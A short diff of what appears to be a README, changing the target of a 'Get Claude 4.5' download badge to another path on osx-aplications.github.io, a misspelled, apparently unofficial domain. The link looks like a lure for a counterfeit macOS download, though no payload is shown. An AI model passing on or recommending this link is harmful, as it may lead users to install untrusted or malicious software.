@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/">
+  <a href="https://osx-aplications.github.io/.github/claude">
     <img src="https://img.shields.io/badge/Get%20Claude%204.5-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Claude 4.5">
   </a>
 </p>
